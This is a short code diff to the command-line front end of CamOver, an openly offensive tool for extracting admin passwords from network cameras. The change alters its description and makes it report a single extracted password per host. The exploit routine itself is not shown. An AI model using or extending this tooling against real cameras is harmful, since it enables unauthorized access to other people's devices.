@@ -32,7 +32,7 @@ from .badges import Badges
 
 
 class CamOverCLI(CamOver, Badges):
-    description = "CamOver is a camera exploitation tool that allows to disclosure network camera credentials."
+    description = "CamOver is a camera exploitation tool that allows to disclosure network camera admin password."
     parser = argparse.ArgumentParser(description=description)
     parser.add_argument('--threads', dest='threads', action='store_true', help='Use threads for fastest work.')
     parser.add_argument('--output', dest='output', help='Output result to file.')
@@ -46,11 +46,11 @@ class CamOverCLI(CamOver, Badges):
 
         if response is not None:
             self.print_process(f"({host}) - accessing device configurations...")
-            creds = self.exploit(response)
+            password = self.exploit(response)
 
-            if creds is not None:
+            if password is not None:
                 self.print_process(f"({host}) - extracting credentials...")
-                return f"({host}) - {creds[0]}:{creds[1]}"
+                return f"({host}) - password: {password}"
             self.print_error(f"({host}) - configurations access denied!")
             return None
         self.print_error(f"({host}) - connection rejected!")
